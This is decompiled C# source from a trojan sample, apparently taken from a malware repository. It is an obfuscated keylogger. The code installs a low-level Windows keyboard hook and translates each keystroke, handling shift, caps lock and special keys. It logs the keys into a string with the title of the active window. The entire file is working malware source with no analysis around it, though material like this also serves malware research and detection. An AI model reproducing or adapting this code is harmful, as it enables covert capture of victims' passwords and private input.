// Decompiled with JetBrains decompiler
// Type: 心羽比鹿黃儿冖几立艮斤.鬼土龍豸子戈宀歹舛戈首靑入廾
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山;

namespace 心羽比鹿黃儿冖几立艮斤
{
  internal sealed class 鬼土龍豸子戈宀歹舛戈首靑入廾
  {
    private const int 幺水入干女彡凵瓦見口手 = 256;
    private const int 鳥襾士非辛言木士攴爪二干高爪 = 13;
    private static IntPtr 口糸儿心戶耒骨刀衣厂冖 = IntPtr.Zero;
    private static 鬼土龍豸子戈宀歹舛戈首靑入廾.示十歹手戶力夕冫女支禾門心气羽 无鼠靑毋又田犬厶宀宀 = new 鬼土龍豸子戈宀歹舛戈首靑入廾.示十歹手戶力夕冫女支禾門心气羽(鬼土龍豸子戈宀歹舛戈首靑入廾.勹工爪十手足隶甘爪巛片黑頁);
    public static bool 黃田曰屮衣手凵亠二水卩十土疋 = false;
    public static string 几走彡匚走黍生夕艮竹 = "";
    private static string 鼎己豆廴鼎力禸父入亠斗入門;
    public static Thread 寸山牛豕手白小比广缶刀韋言 = new Thread(new ThreadStart(鬼土龍豸子戈宀歹舛戈首靑入廾.卜厂鬲无八虍尢二方犬水));

    [DllImport("user32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr 玄龜廴夕彡卩黹香韭二勹矛戶(
      int 欠魚方二鹵夊气皿水宀,
      鬼土龍豸子戈宀歹舛戈首靑入廾.示十歹手戶力夕冫女支禾門心气羽 大玉父皮水斤刀毋父韭人,
      IntPtr 鬲刀革戶匚戈牛夂弋土牛鬥冫儿,
      uint 女虫小韋八示心欠厶几夊厂艸心);

    [DllImport("user32.dll", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool 石襾寸豸毛舛彳片虫无牙言(IntPtr 牙麥文首犬戈辵弓艮里言水言金斗八);

    [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr 頁文亅黽人白豕竹鼠小干(
      IntPtr 爿豆口門臣心寸寸麻刀牙比行鬥大而,
      int 黽八田士用囗欠飛尸斤至鬯豸彐,
      IntPtr 舟卜二水臣片工首鼻玄艸囗厶气玄,
      IntPtr 八冫邑犬目父己黽弓己片頁);

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr 水丿力爿大火辛辰羽文爪丿車(string 耒牛刀用弋冂食鬥工丿尢殳斤日子瓜);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint 屮夕香生又牛黑黍手里巛廾耒耒(IntPtr 牛爿子尢心酉用山鼓足里, out uint 二方老鬲貝力比弋宀匚);

    [DllImport("user32.dll", EntryPoint = "GetKeyState", CharSet = CharSet.Auto)]
    private static extern short 土鼠女鼠工革襾冖力羊小(int 身身糸非白而凵山凵十冂食);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool 氏心竹木貝貝飛非羽寸(byte[] 矢隹气口老麻鬼彐寸鳥手疒亠里臼殳);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout")]
    private static extern IntPtr 缶卩豕毛夂尢釆殳寸鳥目魚火亠(uint 木二彳鼓支力方見彳牛黹己小);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    private static extern int 疋虍頁土襾牛土隹白幺文夕厂(
      uint 毋火辵无革匸面鼓匚廾阜士,
      uint 气夕攴无爪卜殳立尢食刀老尸山,
      byte[] 高乙父牙夊舌靑网口彳舟刀玉,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder 鬲支十言口豆匕戶毛耳厶,
      int 尢毋隹龍止气皿山片龠弓歹心刀,
      uint 己立口毛止士自女戈金鼠襾鬯酉,
      IntPtr 口冫木匚缶几爿氏鼓龍山麻矢音);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    private static extern uint 牛匕斤骨舛疒玉舌衣囗龍(uint 鼻殳色老矢聿火皮玉戈廴隶用宀, uint 韭犬麥香玉皮亠匚夕廾屮匕食);

    private static void 卜厂鬲无八虍尢二方犬水()
    {
      鬼土龍豸子戈宀歹舛戈首靑入廾.口糸儿心戶耒骨刀衣厂冖 = 鬼土龍豸子戈宀歹舛戈首靑入廾.玄黹門女斗貝疒己欠牛(鬼土龍豸子戈宀歹舛戈首靑入廾.无鼠靑毋又田犬厶宀宀);
      Application.Run();
    }

    private static IntPtr 玄黹門女斗貝疒己欠牛(鬼土龍豸子戈宀歹舛戈首靑入廾.示十歹手戶力夕冫女支禾門心气羽 玄小殳欠支厶殳夕鬯耒殳革广)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
        return 鬼土龍豸子戈宀歹舛戈首靑入廾.玄龜廴夕彡卩黹香韭二勹矛戶(13, 玄小殳欠支厶殳夕鬯耒殳革广, 鬼土龍豸子戈宀歹舛戈首靑入廾.水丿力爿大火辛辰羽文爪丿車(currentProcess.ProcessName), 0U);
    }

    private static IntPtr 勹工爪十手足隶甘爪巛片黑頁(
      int 止廾月八彳幺甘歹冫龍禾,
      IntPtr 食夕比玉工血言生片土肉穴,
      IntPtr 尢車二工工廴宀皿勹一)
    {
      if (!鬼土龍豸子戈宀歹舛戈首靑入廾.黃田曰屮衣手凵亠二水卩十土疋)
        return IntPtr.Zero;
      if (止廾月八彳幺甘歹冫龍禾 >= 0 && 食夕比玉工血言生片土肉穴 == (IntPtr) 256)
      {
        int 支辵疋手尸瓦冂非八氏十木禾 = Marshal.ReadInt32(尢車二工工廴宀皿勹一);
        bool flag1 = ((uint) 鬼土龍豸子戈宀歹舛戈首靑入廾.土鼠女鼠工革襾冖力羊小(20) & (uint) ushort.MaxValue) > 0U;
        bool flag2 = ((int) 鬼土龍豸子戈宀歹舛戈首靑入廾.土鼠女鼠工革襾冖力羊小(160) & 32768) != 0 || ((uint) 鬼土龍豸子戈宀歹舛戈首靑入廾.土鼠女鼠工革襾冖力羊小(161) & 32768U) > 0U;
        string str1 = 鬼土龍豸子戈宀歹舛戈首靑入廾.面音血卜辰鬼冖風齊心爿尢疋月((uint) 支辵疋手尸瓦冂非八氏十木禾);
        string str2 = !(flag1 | flag2) ? str1.ToLower() : str1.ToUpper();
        if (支辵疋手尸瓦冂非八氏十木禾 >= 112 && 支辵疋手尸瓦冂非八氏十木禾 <= 135)
        {
          str2 = "[" + ((Keys) 支辵疋手尸瓦冂非八氏十木禾).ToString() + "]";
        }
        else
        {
          string 鼠竹幺缶竹竹見竹貝干皿韭鼠金 = ((Keys) 支辵疋手尸瓦冂非八氏十木禾).ToString();
          // ISSUE: reference to a compiler-generated method
          switch (亠聿干首无貝力冖夊赤止女.八气殳石非丨夕几衣十(鼠竹幺缶竹竹見竹貝干皿韭鼠金))
          {
            case 298493515:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Capital")
              {
                str2 = !flag1 ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]";
                break;
              }
              break;
            case 497839467:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "LControlKey")
              {
                str2 = "[CTRL]";
                break;
              }
              break;
            case 547024555:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "LWin")
              {
                str2 = "[WIN]";
                break;
              }
              break;
            case 3082514982:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Escape")
              {
                str2 = "[ESC]";
                break;
              }
              break;
            case 3250860581:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Space")
              {
                str2 = " ";
                break;
              }
              break;
            case 3264564162:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Back")
              {
                str2 = "[Back]";
                break;
              }
              break;
            case 3422663135:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Return")
              {
                str2 = "[ENTER]";
                break;
              }
              break;
            case 3822460366:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "RShiftKey")
              {
                str2 = "[Shift]";
                break;
              }
              break;
            case 3954224277:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "RControlKey")
              {
                str2 = "[CTRL]";
                break;
              }
              break;
            case 4117013200:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "LShiftKey")
              {
                str2 = "[Shift]";
                break;
              }
              break;
            case 4219689196:
              if (鼠竹幺缶竹竹見竹貝干皿韭鼠金 == "Tab")
              {
                str2 = "[Tab]";
                break;
              }
              break;
          }
        }
        if (str2.Equals("[ENTER]"))
        {
          if (鬼土龍豸子戈宀歹舛戈首靑入廾.鼎己豆廴鼎力禸父入亠斗入門 == 斤耒聿田尢爿尢舌一音文手舟虫.非牙弋弓二方鳥片至比虫)
          {
            鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹 += Environment.NewLine;
          }
          else
          {
            鬼土龍豸子戈宀歹舛戈首靑入廾.鼎己豆廴鼎力禸父入亠斗入門 = 斤耒聿田尢爿尢舌一音文手舟虫.非牙弋弓二方鳥片至比虫;
            鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹 = 鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹 + "\n###  " + 鬼土龍豸子戈宀歹舛戈首靑入廾.鼎己豆廴鼎力禸父入亠斗入門 + " ###\n";
          }
        }
        else
          鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹 = !str2.Equals("[Back]") || 鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹.Length <= 0 ? 鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹 + str2 : 鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹.Remove(鬼土龍豸子戈宀歹舛戈首靑入廾.几走彡匚走黍生夕艮竹.Length - 1, 1);
      }
      return 鬼土龍豸子戈宀歹舛戈首靑入廾.頁文亅黽人白豕竹鼠小干(鬼土龍豸子戈宀歹舛戈首靑入廾.口糸儿心戶耒骨刀衣厂冖, 止廾月八彳幺甘歹冫龍禾, 食夕比玉工血言生片土肉穴, 尢車二工工廴宀皿勹一);
    }

    private static string 面音血卜辰鬼冖風齊心爿尢疋月(uint 支辵疋手尸瓦冂非八氏十木禾)
    {
      try
      {
        StringBuilder 鬲支十言口豆匕戶毛耳厶 = new StringBuilder();
        byte[] numArray = new byte[256];
        if (!鬼土龍豸子戈宀歹舛戈首靑入廾.氏心竹木貝貝飛非羽寸(numArray))
          return "";
        uint 气夕攴无爪卜殳立尢食刀老尸山 = 鬼土龍豸子戈宀歹舛戈首靑入廾.牛匕斤骨舛疒玉舌衣囗龍(支辵疋手尸瓦冂非八氏十木禾, 0U);
        IntPtr 口冫木匚缶几爿氏鼓龍山麻矢音 = 鬼土龍豸子戈宀歹舛戈首靑入廾.缶卩豕毛夂尢釆殳寸鳥目魚火亠(鬼土龍豸子戈宀歹舛戈首靑入廾.屮夕香生又牛黑黍手里巛廾耒耒(斤耒聿田尢爿尢舌一音文手舟虫.歹聿毛山凵革广卜尢龜日(), out uint _));
        鬼土龍豸子戈宀歹舛戈首靑入廾.疋虍頁土襾牛土隹白幺文夕厂(支辵疋手尸瓦冂非八氏十木禾, 气夕攴无爪卜殳立尢食刀老尸山, numArray, 鬲支十言口豆匕戶毛耳厶, 5, 0U, 口冫木匚缶几爿氏鼓龍山麻矢音);
        return 鬲支十言口豆匕戶毛耳厶.ToString();
      }
      catch
      {
      }
      return ((Keys) 支辵疋手尸瓦冂非八氏十木禾).ToString();
    }

    private delegate IntPtr 示十歹手戶力夕冫女支禾門心气羽(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
